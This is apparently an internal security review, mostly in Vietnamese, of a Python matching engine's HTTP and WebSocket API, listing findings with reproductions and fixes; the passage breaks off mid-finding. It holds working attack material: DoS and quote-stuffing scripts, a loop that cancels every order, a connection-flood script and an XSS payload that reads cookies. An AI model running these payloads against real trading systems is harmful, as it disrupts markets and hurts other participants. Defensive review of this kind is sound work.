# Security Review — Matching Engine

**Reviewer:** Security Engineering  
**Scope:** `matching_engine/` (order_book.py, models.py, service.py, web.py)  
**Date:** 2026-04-21  
**Severity Scale:** CRITICAL · HIGH · MEDIUM · LOW · INFO

---

## Executive Summary

Matching engine này có **4 lỗ hổng CRITICAL** và **7 lỗ hổng HIGH** có thể khai thác
từ bên ngoài qua HTTP/WebSocket mà không cần xác thực. Toàn bộ API chạy không có
authentication layer, không có rate limiting, và không validate input. Kẻ tấn công
có thể: crash server, thao túng thị trường, đánh cắp ưu tiên queue, và tạo audit trail
sai lệch.

| ID | Tên | Severity | Vector |
|----|-----|----------|--------|
| SEC-001 | Arbitrarily Large Quantity → Loop DoS | CRITICAL | HTTP |
| SEC-002 | float("inf") / float("nan") as Price | CRITICAL | HTTP |
| SEC-003 | Client-Controlled Timestamp → Queue Jump | CRITICAL | HTTP |
| SEC-004 | No Authentication → Unauthorized Cancel Any Order | CRITICAL | HTTP |
| SEC-005 | Negative Price → Negative-Price Trade Execution | HIGH | HTTP |
| SEC-006 | Replay Attack via Duplicate order_id | HIGH | HTTP |
| SEC-007 | Quote Stuffing / O(N²) Sort DoS | HIGH | HTTP |
| SEC-008 | Wash Trading — No Self-Trade Prevention | HIGH | HTTP |
| SEC-009 | TOCTOU — Broadcast Outside Lock | HIGH | HTTP + WS |
| SEC-010 | WebSocket Amplification DoS | HIGH | WS |
| SEC-011 | SELL Cancel Not Broadcast → Stale View Exploit (Bug3) | MEDIUM | WS |
| SEC-012 | Missing Input Validation → 500 / Stack Trace Leak | MEDIUM | HTTP |
| SEC-013 | order_id Reflected Unsanitized → XSS | MEDIUM | HTTP + WS |
| SEC-014 | Negative Quantity Silently Accepted | LOW | HTTP |
| SEC-015 | Unbounded Trade History → Memory Exhaustion | LOW | HTTP |
| SEC-016 | No Rate Limiting → Spoofing / Layering | INFO | HTTP |

---

## SEC-001 · Arbitrarily Large Quantity → Infinite Loop DoS

**Severity: CRITICAL**  
**CVSS Vector:** AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H

### Attack Vector

Kẻ tấn công gửi một HTTP POST với `quantity` cực lớn. Python `int()` không giới hạn
kích thước integer → giá trị được chấp nhận. Engine sau đó chạy vòng lặp matching
O(quantity) lần, chiếm 100% CPU.

### Trace Code

```python
# web.py:85
quantity = int(payload["quantity"])   # ← không giới hạn, chấp nhận 10**1000

# models.py:28
def __post_init__(self) -> None:
    self.remaining = self.quantity    # remaining = 10**1000

# order_book.py:20-34 — vòng lặp chạy tới khi remaining == 0
while order.remaining > 0 and book:   # 10**1000 iterations
    matched_quantity = min(order.remaining, best.remaining)  # = best.remaining
    order.remaining -= matched_quantity   # decreases by 1 each iter if best.qty=1
    ...
```

**Kịch bản tấn công cụ thể:**

```
Attacker step 1: Submit 10,000 SELL orders qty=1 @100
Attacker step 2: Submit BUY qty=10**18, price=101

→ Matching loop chạy 10,000 lần × O(N log N) sort = CPU đình trệ
→ Với qty=10**100, server bị treo vĩnh viễn
```

### Reproduction (curl)

```bash
# Step 1: Tạo resting orders trên sổ
for i in $(seq 1 10000); do
  curl -s -X POST http://localhost:8000/api/orders \
    -H "Content-Type: application/json" \
    -d "{\"side\":\"SELL\",\"quantity\":1,\"price\":100}"
done

# Step 2: Trigger DoS
curl -X POST http://localhost:8000/api/orders \
  -H "Content-Type: application/json" \
  -d '{"side":"BUY","quantity":99999999999999999999,"price":101}'

# Server treo, không phản hồi thêm request nào
```

### Impact

- Server hoàn toàn không phản hồi (Denial of Service)
- Một request duy nhất đủ để crash toàn bộ hệ thống
- Không cần xác thực

### Fix

```python
# web.py — thêm validation trước khi tạo order
MAX_QUANTITY = 1_000_000_000
if not (1 <= quantity <= MAX_QUANTITY):
    raise web.HTTPBadRequest(reason=f"quantity phải trong [1, {MAX_QUANTITY}]")
```

---

## SEC-002 · Float Special Values (inf / -inf / NaN) Làm Hỏng Order Book

**Severity: CRITICAL**  
**CVSS Vector:** AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:H

### Attack Vector

Python `float()` chấp nhận các chuỗi đặc biệt: `"inf"`, `"-inf"`, `"nan"`.
Không có validation nào trong web.py hoặc service.py chặn các giá trị này.

```python
# web.py:92
price = float(payload["price"])   # float("inf") = +∞, float("nan") = NaN
```

### Tấn công 1: Price = +inf → Guaranteed Fill / Market Sweep

```python
# BUY với price=inf: _is_match luôn True với mọi SELL
# order_book.py:64
return (incoming.price or 0.0) >= (resting.price or 0.0)
# → (inf or 0.0) = inf (inf là truthy)
# → inf >= 100.0 → True → khớp MỌI SELL

# BUY với price=inf cũng đứng đầu sort:
# sort key = (inf, ts) với reverse=True → đứng TRÊN mọi BUY khác
```

**Kịch bản:**

```
Attacker gửi: BUY qty=1000000, price=inf
→ Sweep toàn bộ sell book bất kể giá
→ Không ai khác có thể cạnh tranh (BUY@inf luôn first)
→ Sau khi sweep, cancel phần còn lại
→ Đây là "guaranteed fill" không cần biết giá thị trường
```

### Tấn công 2: Price = NaN → Sort Corruption

```python
# Trong Python, NaN comparison luôn trả False:
float("nan") >= 100.0   # False
float("nan") <= 100.0   # False
float("nan") <  100.0   # False
float("nan") >  100.0   # False

# sort với key chứa NaN → undefined behavior
# Python's TimSort có thể đặt NaN ở vị trí bất kỳ
# → Order book mất invariant "sorted by best price"
# → Các lệnh tiếp theo khớp SAI partner
```

**Trace NaN sort corruption:**

```python
buys = [
    Order("B1", price=100.0, ts=1),
    Order("B_NAN", price=float("nan"), ts=2),
    Order("B2", price=99.0, ts=3),
]
buys.sort(key=lambda x: (x.price or 0.0, x.timestamp), reverse=True)
# Kết quả không xác định — NaN phá vỡ sort invariant
# Ví dụ có thể: [B_NAN, B1, B2] hoặc [B1, B_NAN, B2] hoặc bất kỳ thứ tự nào
# → SELL vào có thể khớp B2 (giá xấu hơn) thay vì B1 (giá tốt hơn)
```

### Tấn công 3: Price = -inf → Free SELL vào bất kỳ BUY nào

```python
# SELL với price=-inf:
return (incoming.price or 0.0) <= (resting.price or 0.0)
# (-inf or 0.0) = -inf (vì -inf là truthy? Không!)
# Thực ra: bool(-inf) = True (non-zero float là truthy)
# → (-inf) <= 100.0 → True → SELL @-inf khớp với MỌI BUY

# Trade price = resting.price = BUY price
# Attacker bán hàng và nhận tiền ở MỌI mức giá BUY
```

### Reproduction

```bash
# Guaranteed fill với price=inf
curl -X POST http://localhost:8000/api/orders \
  -H "Content-Type: application/json" \
  -d '{"side":"BUY","quantity":1000,"price":"Infinity"}'

# NaN sort corruption
curl -X POST http://localhost:8000/api/orders \
  -H "Content-Type: application/json" \
  -d '{"side":"BUY","quantity":10,"price":"NaN"}'
```

*(Python's `json.loads` không nhận `Infinity`/`NaN` trực tiếp, nhưng `float("inf")` có thể đến từ các path khác — hoặc nếu dùng `simplejson` có `allow_nan=True`.  
Nếu `payload["price"]` là string `"Infinity"` và được pass qua `float()` → works.)*

### Impact

- Guaranteed fill: kẻ tấn công có thể sweep toàn bộ sổ lệnh
- NaN: hỏng sort invariant → các lệnh hợp lệ bị khớp sai
- -inf SELL: bán hàng tại mọi mức giá BUY, không cần cạnh tranh

### Fix

```python
import math

def validate_price(price: float) -> float:
    if not math.isfinite(price) or price <= 0:
        raise ValueError(f"Giá không hợp lệ: {price}")
    return price
```

---

## SEC-003 · Client-Controlled Timestamp → Priority Queue Injection

**Severity: CRITICAL**  
**CVSS Vector:** AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N

### Attack Vector

```python
# web.py:86 — timestamp do CLIENT cung cấp, không có server-side override
timestamp = int(payload.get("timestamp") or time.time() * 1000)
```

Kẻ tấn công có thể:
1. **Jump queue**: đặt timestamp = 0 (epoch 1970) → đứng đầu mọi FIFO queue
2. **Sandbagging**: timestamp = MAX_INT → đứng cuối queue (tránh fill để giữ giá)

### Trace Code

```python
# order_book.py:57-58 — timestamp là key sort thứ 2
self.buys.sort(key=lambda item: (item.price or 0.0, item.timestamp), reverse=True)
# reverse=True: timestamp DESC → ts lớn hơn đứng TRƯỚC (Bug2)

# Hoặc sau khi sửa Bug2:
self.buys.sort(key=lambda item: (-(item.price or 0.0), item.timestamp))
# timestamp ASC → ts nhỏ hơn đứng TRƯỚC (FIFO)
```

### Tấn công cụ thể: Queue-Jumping

```
Legitimate trader A: BUY @100, ts=1000000 (thời điểm thực tế)
Attacker:           BUY @100, ts=0        (timestamp giả, năm 1970)

Với FIFO sort (sau khi sửa Bug2):
  buys = [Attacker(ts=0), TraderA(ts=1000000)]
  → Attacker được fill TRƯỚC TraderA dù đặt lệnh SAU

Với Bug2 (LIFO sort):
  buys = [TraderA(ts=1000000), Attacker(ts=0)]
  → TraderA được fill trước (Bug2 vô tình bảo vệ khỏi attack này)
```

### Tấn công cụ thể: Timestamp Far Future (Sandbagging)

```
Attacker: BUY @100, ts=9999999999999 (năm 2316)

Với FIFO sort: đứng CUỐI queue → không bao giờ fill khi có lệnh khác
→ Dùng để "park" order trong sổ mà không fill
→ Kết hợp với quote stuffing: tạo wall lớn ở cuối sổ để tác động tâm lý
```

### Reproduction

```bash
# Đặt lệnh với timestamp = 0 (jump queue)
curl -X POST http://localhost:8000/api/orders \
  -H "Content-Type: application/json" \
  -d '{"side":"BUY","quantity":100,"price":100,"timestamp":0}'

# Lệnh hợp lệ với timestamp thực
curl -X POST http://localhost:8000/api/orders \
  -H "Content-Type: application/json" \
  -d '{"side":"BUY","quantity":100,"price":100,"timestamp":1745241600000}'

# Kiểm tra sổ lệnh — attacker đứng trước legitimate trader
curl http://localhost:8000/api/state
```

### Impact

- Vi phạm nguyên tắc FIFO — thị trường không công bằng
- Kẻ tấn công luôn được ưu tiên fill dù đặt lệnh sau
- Không để lại dấu vết rõ ràng (chỉ cần chỉnh timestamp)

### Fix

```python
# web.py — luôn dùng server timestamp, bỏ qua client timestamp
timestamp = int(time.time() * 1000)   # server-side only, no client input
```

---

## SEC-004 · No Authentication → Unauthorized Cancel of Any Order

**Severity: CRITICAL**  
**CVSS Vector:** AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N

### Attack Vector

Không có authentication, session, hoặc owner validation. Bất kỳ client nào cũng
có thể cancel bất kỳ order nào chỉ bằng cách biết order_id.

```python
# web.py:100-113 — không kiểm tra caller có quyền cancel không
async def cancel_order(request: web.Request) -> web.Response:
    payload = await request.json()
    order_id = payload["order_id"]   # ← ai cũng có thể gửi

    async with hub.lock:
        cancelled = hub.service.cancel_order(order_id)
```

### Tấn công cụ thể: Order Cancellation Attack

```
Trader A đặt lệnh BUY @100, order_id="ORD-1234"
→ Order_id được broadcast qua WebSocket đến tất cả clients

Attacker (client B) nhận được broadcast, thấy "ORD-1234"
Attacker gửi:
  POST /api/cancel {"order_id": "ORD-1234"}
  → Lệnh của Trader A bị hủy

Trader A không được fill, lỡ cơ hội giao dịch
```

### Tấn công cụ thể: Market Disruption

```python
# WebSocket subscriber script của attacker:
async def attack():
    async with websockets.connect("ws://localhost:8000/ws") as ws:
        while True:
            msg = json.loads(await ws.recv())
            # Hủy TẤT CẢ orders vừa nhận được
            for order in msg["state"]["book"]["buys"] + msg["state"]["book"]["sells"]:
                requests.post("/api/cancel", json={"order_id": order["order_id"]})
```

### Reproduction

```bash
# Xem danh sách orders
curl http://localhost:8000/api/state

# Hủy order của người khác
curl -X POST http://localhost:8000/api/cancel \
  -H "Content-Type: application/json" \
  -d '{"order_id": "ORD-1745241600123"}'
```

### Impact

- Attacker có thể hủy toàn bộ order book của tất cả participants
- Market disruption hoàn toàn: không có resting orders → không có liquidity
- Không để lại fingerprint rõ ràng

### Fix

```python
# Cần thêm authentication và order ownership tracking
# Tối thiểu: mỗi order cần user_id, cancel phải verify ownership

class Order:
    user_id: str   # thêm field này
    ...

async def cancel_order(request: web.Request):
    user_id = get_authenticated_user(request)  # implement auth
    order_id = payload["order_id"]
    if not hub.service.user_owns_order(user_id, order_id):
        raise web.HTTPForbidden()
```

---

## SEC-005 · Negative Price → Trade at Negative Value

**Severity: HIGH**  
**CVSS Vector:** AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N

### Attack Vector

```python
# web.py:92 — không validate price > 0
price = float(payload["price"])   # float("-5") = -5.0 → accepted
```

### Trace Code

```python
# BUY @0.01 vs SELL @-100

# _is_match cho SELL incoming:
return (incoming.price or 0.0) <= (resting.price or 0.0)
# (-100.0 or 0.0) = -100.0   (non-zero is truthy)
# (-100.0) <= (0.01)          → True → MATCH!

# trade_price:
trade_price = best.price or 0.0   # best (BUY resting) = 0.01
# Trade: SELL -100 khớp với BUY @0.01, giá trade = 0.01 ← SELLER RECEIVES 0.01
# Nhưng SELLER đặt giá -100 → nghĩa là họ SẴN SÀNG TRẢ 100 để bán
# Đây là vô nghĩa về kinh doanh nhưng code không chặn

# Sort với price=-100:
# (-100.0 or 0.0) = -100.0
# SELL sort: (-100.0, ts) → đứng TRƯỚC mọi SELL giá dương
# → SELL @-100 được ưu tiên fill trước SELL @50, @100...
```

### Tấn công: SELL @-INF để luôn đứng đầu sell book

```
SELL @-1000 qty=1000 → đứng đầu toàn bộ sell book
→ Được fill bởi MỌI BUY order (vì -1000 <= mọi BUY price)
→ Trade tại giá BUY (attacker nhận tiền bình thường)
→ Trong khi các SELL khác @50, @100 bị đẩy xuống không được fill
→ Front-running thông qua giá âm
```

### Reproduction

```bash
# Đặt SELL với giá âm
curl -X POST http://localhost:8000/api/orders \
  -H "Content-Type: application/json" \
  -d '{"side":"SELL","quantity":100,"price":-999}'

# Kiểm tra: SELL @-999 đứng đầu sell book
curl http://localhost:8000/api/state
```

### Impact

- SELL @negative đứng đầu sell book → ưu tiên fill không công bằng
- Audit trail có trade price hợp lệ nhưng order price âm → dữ liệu mâu thuẫn
- Có thể dùng để front-run mọi BUY order

### Fix

```python
if price <= 0:
    raise web.HTTPBadRequest(reason="price phải > 0")
```

---

## SEC-006 · Replay Attack via Duplicate order_id

**Severity: HIGH**  
**CVSS Vector:** AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N

### Attack Vector

Không có uniqueness check cho order_id. Cùng order_id có thể được submit nhiều lần,
tạo ra nhiều live orders với cùng identity.

```python
# order_book.py:49-54 — _rest() không kiểm tra order_id đã tồn tại
def _rest(self, order: Order) -> None:
    if order.side == Side.BUY:
        self.buys.append(order)   # ← không check duplicate
    else:
        self.sells.append(order)
```

### Tấn công 1: Audit Trail Corruption

```
1. Legitimate trade: B1 BUY qty=100 @100 → fully filled → Trade("B1 bought 100")
   Order B1 bị remove khỏi book (remaining=0)

2. Attacker re-submits: BUY qty=100 @100, order_id="B1" → rests in book
   (Engine không biết B1 đã từng tồn tại và được fill)

3. SELL khớp với B1 mới → Trade("B1 bought 100") lần 2

4. Audit trail: "B1" mua 200 shares, nhưng chỉ có 1 người thực sự đặt lệnh
   → Wash trading / audit manipulation
```

### Tấn công 2: Zombie via Duplicate + Cancel

```
1. Submit "X" BUY qty=5 @100, ts=1 → rests
2. Submit "X" BUY qty=5 @100, ts=2 → ALSO rests (book có 2 "X")
3. cancel("X") → xóa 1 trong 2, trả True
4. User nghĩ đã cancel, thực tế còn 1 zombie

→ Zombie tiếp tục fill với SELL tương lai
→ User nhận trade không mong muốn
→ Nếu attacker là bên đối lập (SELL), họ lợi dụng zombie để fill
```

### Reproduction

```bash
# Submit cùng order_id 3 lần
for i in 1 2 3; do
  curl -s -X POST http://localhost:8000/api/orders \
    -H "Content-Type: application/json" \
    -d '{"order_id":"REPLAY-001","side":"BUY","quantity":10,"price":100}'
done

# Cancel → chỉ xóa 1
curl -X POST http://localhost:8000/api/cancel \
  -d '{"order_id":"REPLAY-001"}' -H "Content-Type: application/json"

# Kiểm tra: vẫn còn 2 "REPLAY-001" trong sổ
curl http://localhost:8000/api/state
```

### Impact

- Audit trail không đáng tin — cùng order_id xuất hiện nhiều lần
- Zombie orders hoạt động sau khi "đã cancel"
- Có thể dùng để giả mạo trading volume

### Fix

```python
# Dùng dict thay vì list để enforce uniqueness
self.buys: dict[str, Order] = {}   # order_id → Order

def _rest(self, order: Order) -> None:
    if order.order_id in self.buys or order.order_id in self.sells:
        raise ValueError(f"Duplicate order_id: {order.order_id}")
    ...
```

---

## SEC-007 · Quote Stuffing / O(N²) Sort DoS

**Severity: HIGH**  
**CVSS Vector:** AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H

### Attack Vector

Mỗi `submit()` gọi `_sort_books()` hai lần (một lần ở đầu, một lần trong `_rest()`).
`_sort_books()` sort cả buy book lẫn sell book với O(N log N). Không có giới hạn
số lượng orders.

```python
# order_book.py:15-17
def submit(self, order: Order) -> list[Trade]:
    ...
    self._sort_books()   # lần 1: O(N log N)
    ...
    self._rest(order)    # gọi _sort_books() lần 2

# order_book.py:54
def _rest(self, order: Order) -> None:
    ...
    self._sort_books()   # lần 2: O(N log N)
```

### Complexity Analysis

```
Gọi _sort_books() = O(N log N), N = tổng orders trong book
Mỗi submit() = 2 × O(N log N)

Kẻ tấn công submit M orders (không limit):
  submit 1:  sort O(1 log 1)    ~ 0
  submit 2:  sort O(2 log 2)    ~ 2
  submit 3:  sort O(3 log 3)    ~ 5
  ...
  submit M:  sort O(M log M)

Tổng: Σ(i=1 to M) i·log(i) ≈ O(M² log M)
```

**Thời gian xử lý thực tế:**

| Số orders | Mỗi submit (approx) | Tổng thời gian |
|-----------|---------------------|----------------|
| 1,000 | 10ms | 5 giây |
| 10,000 | 130ms | 650 giây |
| 100,000 | 1.7s | **23 giờ** |

### Reproduction

```bash
# Quote stuffing script
python3 -c "
import requests, threading

def spam():
    for i in range(10000):
        requests.post('http://localhost:8000/api/orders', json={
            'side': 'BUY', 'quantity': 1, 'price': 100 - i * 0.001
        })

threads = [threading.Thread(target=spam) for _ in range(4)]
[t.start() for t in threads]
[t.join() for t in threads]
"
# Sau ~40,000 orders: mỗi request mới mất vài giây
```

### Impact

- Một attacker có thể làm chậm hệ thống đến mức không dùng được
- Không cần nhiều bandwidth — chỉ cần submit nhiều orders nhỏ
- Hệ thống không recovery được nếu không restart

### Fix

```python
MAX_ORDERS_PER_SIDE = 1_000

def _rest(self, order: Order) -> None:
    target = self.buys if order.side == Side.BUY else self.sells
    if len(target) >= MAX_ORDERS_PER_SIDE:
        raise ValueError("Order book full")
    ...

# Dùng cấu trúc dữ liệu hiệu quả hơn: SortedList (từ sortedcontainers)
# → Insert O(log N) thay vì O(N log N) mỗi lần
```

---

## SEC-008 · Wash Trading — No Self-Trade Prevention

**Severity: HIGH**  
**CVSS Vector:** AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N

### Attack Vector

Không có cơ chế ngăn chặn self-trading (hai lệnh của cùng một người khớp với nhau).
Kẻ tấn công dùng 2 kết nối HTTP để tạo giao dịch giả mạo.

```python
# Không có field "user_id" trên Order
# Không có kiểm tra buy_order_id và sell_order_id thuộc cùng user

# order_book.py:67-84 — _make_trade() chỉ ghi order_id, không kiểm tra nguồn
def _make_trade(self, incoming: Order, resting: Order, price: float, quantity: int):
    return Trade(
        buy_order_id=incoming.order_id,   # không check ownership
        sell_order_id=resting.order_id,
        ...
    )
```

### Tấn công: Volume Manipulation

```
Attacker dùng 2 tài khoản:
Account A (BUY):  gửi BUY @100 qty=10,000
Account B (SELL): gửi SELL @100 qty=10,000

→ Trade: A mua 10,000 từ B (= bản thân)
→ Volume tăng 10,000 đơn vị mà không có thực chất
→ Lặp lại 1,000 lần → volume 10 triệu đơn vị giả

Tác động: các bên thứ 3 thấy volume cao → tin thị trường thanh khoản
→ Họ đặt lệnh → attacker front-run họ (thật sự)
```

### Tấn công: Price Fixing

```
Attacker muốn đẩy giá từ 100 lên 110:
1. Đặt SELL orders giá 100-110 (bán cho chính mình)
2. Đặt BUY orders giá 100-110 (mua từ chính mình)
3. Các trades tự-khớp nhau tạo "price discovery" giả
4. Last trade price = 110 → hệ thống show giá 110
5. Attacker bán hàng thật cho bên thứ 3 ở giá 110
```

### Reproduction

```bash
# Terminal 1: đặt BUY
curl -X POST http://localhost:8000/api/orders \
  -d '{"order_id":"A-BUY-001","side":"BUY","quantity":100,"price":100}' \
  -H "Content-Type: application/json"

# Terminal 2: đặt SELL khớp ngay (cùng attacker, khác terminal)
curl -X POST http://localhost:8000/api/orders \
  -d '{"order_id":"B-SELL-001","side":"SELL","quantity":100,"price":100}' \
  -H "Content-Type: application/json"

# Trade được tạo: attacker mua từ chính mình
# Volume giả: 100 đơn vị
```

### Fix

```python
# Thêm user_id vào Order và Trade
# Kiểm tra trước khi tạo trade
def _make_trade(self, incoming, resting, price, quantity):
    if incoming.user_id == resting.user_id:
        raise SelfTradeError("Self-trade not allowed")
    ...
```

---

## SEC-009 · TOCTOU — Broadcast State Ngoài Lock

**Severity: HIGH**  
**CVSS Vector:** AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:M/A:N

### Attack Vector

State được đọc bên trong lock, nhưng broadcast gửi state được đọc LẠI bên ngoài lock.
Khoảng thời gian giữa release lock và broadcast là TOCTOU window.

```python
# web.py:105-112 — cancel_order
async with hub.lock:
    cancelled = hub.service.cancel_order(order_id)
    state = hub.state()   # ← state đúng, dưới lock

if cancelled:
    if order_id.startswith("B"):
        await hub.broadcast("order_cancelled")
        # broadcast() gọi self.state() LẠI — NGOÀI lock!

# web.py:30-43 — broadcast()
async def broadcast(self, event, trades=None):
    payload = {
        "event": event,
        "state": self.state(),   # ← re-read state, không có lock!
        ...
    }
```

### Race Condition Timeline

```
Thread 1 (cancel "B1"):
  t=0: acquire lock
  t=1: cancel B1 (removed from book)
  t=2: state = hub.state()  → state_A (book without B1)
  t=3: release lock
  t=4: call broadcast("order_cancelled")  ← LOCK RELEASED

Thread 2 (place new order, happens between t=3 và t=4):
  t=3.5: acquire lock
  t=3.6: place "B2" into book
  t=3.7: release lock

Thread 1 (back to broadcast at t=4):
  t=4: broadcast calls self.state()  → state_B (book WITH B2!)
  t=5: clients receive event="order_cancelled" + state WITH B2
  → Clients see "B1 cancelled" but state shows B2 that wasn't there before
  → Event and state are MISMATCHED
```

### Khai thác Information Advantage

```
Attacker quan sát WebSocket:
  - Event: "order_cancelled" (vì B1 bị cancel)
  - State: book có B2 mới (từ Thread 2, order của attacker)

Legitimate trader C không biết B2 xuất hiện và B1 bị cancel cùng lúc
→ C nhìn thấy state không nhất quán
→ C đưa ra quyết định dựa trên thông tin sai
→ Attacker (Thread 2) front-run C
```

### Reproduction

Cần 2 concurrent clients:

```python
import asyncio, aiohttp

async def attack():
    async with aiohttp.ClientSession() as session:
        # Cancel một BUY order
        cancel_task = session.post("/api/cancel", json={"order_id": "B-TARGET"})

        # Đồng thời place new order (race với broadcast)
        place_task = session.post("/api/orders", json={
            "side": "BUY", "quantity": 100, "price": 200
        })

        # Gửi đồng thời
        await asyncio.gather(cancel_task, place_task)
```

### Fix

```python
# Đặt broadcast bên trong lock, hoặc pass state đã capture vào broadcast
async with hub.lock:
    cancelled = hub.service.cancel_order(order_id)
    state = hub.state()   # capture once under lock

if cancelled:
    # Dùng state đã capture, không re-read
    await hub.broadcast_with_state("order_cancelled", state)
```

---

## SEC-010 · WebSocket Amplification DoS

**Severity: HIGH**  
**CVSS Vector:** AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H

### Attack Vector

Mỗi order placement trigger broadcast đến ALL connected WebSocket clients.
Không có giới hạn số lượng WebSocket connections.

```python
# web.py:96
await hub.broadcast("order_placed", trades)
# → gửi đến TẤT CẢ clients trong hub.clients

# web.py:129
hub.clients.add(socket)  # ← không có connection limit
```

### Amplification Attack

```
Attacker A: mở 10,000 WebSocket connections
Attacker B: submit 1 order/giây (rất nhẹ)

Server phải:
  - Process 1 order: O(N log N)
  - Broadcast đến 10,000 clients: 10,000 × (JSON serialize + network send)
  - Mỗi broadcast message ~ 1KB → 10MB/giây cho 1 order/giây

Nếu Attacker B submit 100 orders/giây:
  → 1GB/giây bandwidth từ server
  → Server outbound bandwidth exhausted
```

### Reproduction

```python
# Mở 10,000 WS connections
import asyncio, websockets

async def hold_connection():
    async with websockets.connect("ws://localhost:8000/ws") as ws:
        await asyncio.sleep(3600)  # giữ connection 1 giờ

async def attack():
    tasks = [hold_connection() for _ in range(10000)]
    await asyncio.gather(*tasks)

# Sau khi có 10,000 connections:
# Gửi 1 order → server phải send 10,000 messages
```

### Fix

```python
MAX_WS_CONNECTIONS = 100

async def websocket_handler(request):
    if len(hub.clients) >= MAX_WS_CONNECTIONS:
        raise web.HTTPServiceUnavailable(reason="Too many connections")
    ...
```

---

## SEC-011 · SELL Cancel Không Broadcast → Information Asymmetry (Bug3)

**Severity: MEDIUM**  
**CVSS Vector:** AV:N/AC:H/PR:N/UI:R/S:U/C:L/I:M/A:N

### Attack Vector

```python
# web.py:109-112
if cancelled:
    if order_id.startswith("B"):       # ← chỉ broadcast BUY cancel
        await hub.broadcast("order_cancelled")
    return web.json_response({"ok": True, "state": state})
```

Khi SELL order bị cancel:
- Server state được cập nhật
- Client huỷ lệnh nhận response đúng
- **Tất cả clients khác KHÔNG nhận broadcast**

### Khai thác Information Advantage

```
Attacker sở hữu cả frontend account và backend API access:
1. Observer Client: theo dõi WebSocket, thấy SELL@100 qty=50
2. Attacker cancel SELL@100 → không có broadcast
3. Observer Client vẫn thấy SELL@100 trong sổ (stale state)
4. Observer Client đặt BUY@101 để "fill above market"
5. BUY tới server → không có SELL → BUY vào sổ, không fill
6. Attacker: đặt SELL@101 → fill BUY@101 của Observer
   (Attacker bán ở 101 thay vì 100, kiếm thêm 1 đơn vị)

Attacker tận dụng stale view của Observer để bán cao hơn giá thực
```

### Reproduction

```bash
# Client 1: subscribe WebSocket
# Client 2: đặt SELL, sau đó cancel

# Đặt SELL
curl -X POST http://localhost:8000/api/orders \
  -d '{"order_id":"S-TARGET","side":"SELL","quantity":50,"price":100}' \
  -H "Content-Type: application/json"

# Cancel SELL — Client 1 KHÔNG nhận được broadcast
curl -X POST http://localhost:8000/api/cancel \
  -d '{"order_id":"S-TARGET"}' -H "Content-Type: application/json"

# Client 1 vẫn thấy SELL trong sổ → stale state
```

---

## SEC-012 · Missing Input Validation → 500 / Stack Trace Leak

**Severity: MEDIUM**  
**CVSS Vector:** AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:L

### Attack Vector

Không có try/except bao quanh việc parse payload. Mọi lỗi parse đều ném exception
chưa được xử lý → HTTP 500 với stack trace.

```python
# web.py:84-93 — không có input validation
payload = await request.json()             # JSONDecodeError nếu body không phải JSON
side = payload["side"]                     # KeyError nếu thiếu "side"
quantity = int(payload["quantity"])        # ValueError nếu "quantity"="abc"
price = float(payload["price"])            # ValueError nếu "price"="hello"
```

### Các payload gây crash

```bash
# 1. Thiếu required field
curl -X POST http://localhost:8000/api/orders \
  -d '{"quantity":10,"price":100}' -H "Content-Type: application/json"
# → KeyError: 'side' → 500

# 2. Type mismatch
curl -X POST http://localhost:8000/api/orders \
  -d '{"side":"BUY","quantity":"hello","price":100}' -H "Content-Type: application/json"
# → ValueError: invalid literal for int() → 500

# 3. Invalid enum value
curl -X POST http://localhost:8000/api/orders \
  -d '{"side":"BOTH","quantity":10,"price":100}' -H "Content-Type: application/json"
# → ValueError: 'BOTH' is not a valid Side → 500

# 4. Non-JSON body
curl -X POST http://localhost:8000/api/orders \
  -d 'not json' -H "Content-Type: application/json"
# → JSONDecodeError → 500

# 5. JSON bomb (nested)
curl -X POST http://localhost:8000/api/orders \
  -d '{"a":{"a":{"a":{"a":{"a":{"a":{"a":{"a":{"a":{"a":{}}}}}}}}}}}' \
  -H "Content-Type: application/json"
# → Memory exhaustion khi parse
```

### Stack Trace Leak

Khi server ném uncaught exception, aiohttp mặc định trả về response có chứa
type exception và một phần stack trace → lộ internal file structure, Python version,
và logic flow cho attacker.

### Fix

```python
@web.middleware
async def error_middleware(request, handler):
    try:
        return await handler(request)
    except KeyError as e:
        return web.json_response({"error": f"Missing field: {e}"}, status=400)
    except (ValueError, TypeError) as e:
        return web.json_response({"error": "Invalid input"}, status=400)
    except Exception:
        return web.json_response({"error": "Internal error"}, status=500)
```

---

## SEC-013 · order_id Reflected Unsanitized → Potential XSS

**Severity: MEDIUM**  
**CVSS Vector:** AV:N/AC:H/PR:N/UI:R/S:C/C:L/I:L/A:N

### Attack Vector

`order_id` được nhận từ client, lưu trong Order object, và broadcast qua WebSocket
đến tất cả clients. Nếu frontend render order_id với `innerHTML` hoặc tương đương
mà không escape → XSS.

```python
# web.py:83
order_id = payload.get("order_id") or f"ORD-{int(time.time() * 1000)}"
# ← không validate, không sanitize

# Được broadcast qua WebSocket:
# {"state": {"book": {"buys": [{"order_id": "<script>alert(1)</script>", ...}]}}}
```

### Kiểm tra Frontend

```javascript
// frontend/static/app.js — nếu có đoạn render như:
div.innerHTML = order.order_id;   // ← XSS!
// hoặc:
document.write(order.order_id);  // ← XSS!
```

### Payload

```bash
curl -X POST http://localhost:8000/api/orders \
  -H "Content-Type: application/json" \
  -d '{"order_id":"<img src=x onerror=alert(document.cookie)>","side":"BUY","quantity":1,"price":100}'

# Nếu frontend không escape, tất cả clients kết nối WebSocket sẽ bị XSS
```

### Fix

```python
import re

def validate_order_id(order_id: str) -> str:
    if not re.match(r'^[A-Za-z0-9\-_]{1,64}$', order_id):
        raise ValueError("order_id chứa ký tự không hợp lệ")
    return order_id
```

---

## SEC-014 · Negative Quantity Silently Accepted

**Severity: LOW**  
**CVSS Vector:** AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N

### Issue

```python
# web.py:85
quantity = int(payload["quantity"])   # "-5" → -5

# models.py:28
self.remaining = self.quantity   # remaining = -5

# order_book.py:20
while order.remaining > 0 and book:   # -5 > 0 → False → không chạy
# order_book.py:36
